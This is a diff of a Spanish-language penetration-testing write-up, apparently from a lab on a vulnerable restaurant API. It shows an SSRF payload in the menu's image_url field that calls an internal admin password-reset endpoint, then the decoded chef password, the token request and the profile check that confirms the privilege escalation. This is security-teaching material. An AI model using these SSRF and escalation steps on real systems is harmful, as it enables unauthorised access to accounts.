@@ -1008,61 +1008,70 @@ request body: {
   "name": "string",
   "price": 0,
   "category": "string",
-  "image_url": "string",
+  "image_url": "http://localhost:8091/admin/reset-chef-password",
   "description": "string"
 }
 
+Con la esperanza de que la API haga una solicitud GET a esa URL (http://localhost:8091/admin/reset-chef-password), ver qué responde. Lo más probable es que devuelva una nueva contraseña aleatoria codificada en base64.
 
+**NOTA: no olvidar desactivar el script de Http-sender.**
 
-1. Ir a docs. Para mi caso, el servidor está lanzado en la siguiente dirección:
+2. Coger lo que vino en el campo image_base64 y decodificarlo. Esta debería ser la nueva contraseña del chef.
 
-~~~
-http://192.168.2.92:8091/docs
-~~~
+3. Intentar solicitar un token del usuario Chef.
 
-y buscar en la sección "menu" el método "put" para actualizarlo.
-
-2. Intentar ejecutar el método, así se obtiene el comando para curl:
+4. En caso de que el paso 3 responda con un token, verificar que el usuario sí es el chef usando:
 
 ~~~
-curl -X 'PUT' \
-  'http://localhost:8091/menu' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: application/json' \
-  -d '{
-  "name": "string",
-  "price": 0,
-  "category": "string",
-  "image_url": "string",
-  "description": "string"
-}'
+GET /profile
 ~~~
 
-3. Preparar el comando curl de manera que apunte al servidor y además tenga un token válido como empleado (employee).
+###### RESULTADO
 
-El token se obtiene así, para el usuario y contraseña creados en el 
 
-~~~
-curl -X 'POST' \
-  'http://192.168.2.92:8091/token' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -d 'grant_type=password&username=customer&password=password&scope=&client_id=string&client_secret=string'
-~~~
+1. Se obtuvo la siguiente respuesta:
+
+![](./recursos/2/54.png)
+
 
 ~~~
-curl -X 'PUT' \
-  'http://192.168.2.92:8091/menu' \
-  -H 'accept: application/json' \
-  -H 'Content-Type: application/json' \
-  -d '{
-  "name": "string",
-  "price": 0,
-  "category": "string",
-  "image_url": "string",
-  "description": "string"
-}'
+{
+  "id":15,
+  "name":"string",
+  "price":0.0,
+  "category":"string",
+  "description":"Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.",
+  "image_base64":"eyJwYXNzd29yZCI6IltWPUpQQll5SiFSdzQ6NTFMSk0kaigxOjdVdl5RPUJzIn0="}
 ~~~
+
+2. Al decodificar "image_base64" se tiene este resultado:
+
+![](./recursos/2/55.png)
+
+~~~
+{"password":"[V=JPBYyJ!Rw4:51LJM$j(1:7Uv^Q=Bs"}
+~~~
+
+3. AL intentar solicitar un token con las credenciales:
+
+~~~
+{
+  "username": "chef",
+  "password": [V=JPBYyJ!Rw4:51LJM$j(1:7Uv^Q=Bs
+}
+~~~
+
+Se obtuvo el siguiente resultado:
+
+![](./recursos/2/56.png)
+
+
+4. Hasta ahora parece que sí se ha realizado la SSRF con éxito. Para comprobar que el usuario actual que usa este token es el chef, se usará la función GET /profile:
+
+![](./recursos/2/57.png)
+
+El ataque ha sido un éxito, permitiendo una nueva escalada de privilegios al usuario "Chef".
+
 
 ##### PRUEBA DE EJECUCIÓN DE COMANDOS EN EL SO DESDE LA API
 
